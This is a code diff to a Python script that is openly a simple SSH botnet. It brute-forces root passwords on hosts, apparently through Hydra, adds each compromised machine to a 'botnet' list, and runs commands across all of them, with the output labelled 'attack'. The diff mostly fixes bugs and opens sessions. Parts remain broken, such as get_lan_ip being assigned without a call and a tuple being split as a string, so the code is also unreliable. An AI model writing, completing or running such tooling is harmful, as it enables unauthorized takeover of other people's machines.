@@ -1,11 +1,9 @@
-#!/usr/bin/env python
-import pxssh
+from pexpect import pxssh
 import subprocess
 import numpy as np
 import re
 import get_lan_ip
-
-
+import getpass
 class Bot:
     def __init__(self, host, user, password):
         self.user = user
@@ -15,9 +13,9 @@ class Bot:
 
     def ssh(self):
         try:
-            bot = pxssh.pxssh()
-            bot.login(self.host, self.user, self.password)
-            return bot
+            s = pxssh.pxssh()
+            s.login(self.host, self.user, self.password)
+            return s
         except Exception as e:
             print('Connection failure.')
             print(e)
@@ -28,6 +26,8 @@ class Bot:
 
 def command_bots(command):
     for bot in botnet:
+        s=bot.ssh()
+        bot.session = s
         attack = bot.send_command(command)
         print('Output from ' + bot.host)
         print(attack)
@@ -60,14 +60,14 @@ def hydra(hosts):
         response = output.communicate()
         password = response.split("password: ", 1)[1]
         # if password is valid, add the new bot to botnet
-        if password not None:
+        if password is not None:
             add_bot(h,"root",password)
 
 botnet = []
 def add_bot(host, user, password):
     new_bot = Bot(host, user, password)
     botnet.append(new_bot)
-local_lan_ip = get_lan_ip()
+local_lan_ip = get_lan_ip
 user = subprocess.check_output(['whoami'])
-add_bot(local_lan_ip,user,'passwd')
-command_bots('ls -alr')
+add_bot('ip','user','password')
+command_bots('ls')
